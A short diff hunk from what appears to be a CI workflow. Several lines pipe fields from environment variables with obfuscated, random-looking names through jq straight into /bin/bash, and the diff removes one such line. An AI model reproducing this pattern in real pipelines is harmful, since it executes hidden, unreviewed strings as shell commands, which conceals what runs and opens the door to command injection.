@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$htxlz7" | jq -r .oorha4225 | /bin/bash
           printf '%s' "$rqg7720" | jq -r .qskve43243 | /bin/bash
-          echo $fdq49 | jq -r .b01606 | /bin/bash
           printf '%s' "$a4968" | jq -r .zlqa4 | /bin/bash
 
       - name: Upload artifact
